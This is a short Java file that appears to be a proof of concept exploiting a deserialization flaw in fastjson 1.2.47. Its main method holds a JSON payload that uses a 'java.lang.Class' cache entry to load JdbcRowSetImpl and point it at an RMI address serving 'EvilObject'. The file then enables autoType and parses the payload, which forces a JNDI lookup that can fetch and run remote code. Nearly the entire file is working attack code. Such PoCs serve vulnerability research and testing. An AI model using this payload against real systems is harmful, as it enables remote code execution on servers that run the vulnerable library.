import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
//import org.springframework.beans.factory.config.PropertyPathFactoryBean;

//@dependency{fastjson:1.2.47}
public class jdbcrowsetimpl5 {
    public static void main(String args[]) {
        String payload = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilObject\",\"autoCommit\":true}}}";

        ParserConfig config = new ParserConfig();
        config.getGlobalInstance().setAutoTypeSupport(true);
        Object res = JSON.parse(payload);



    }
}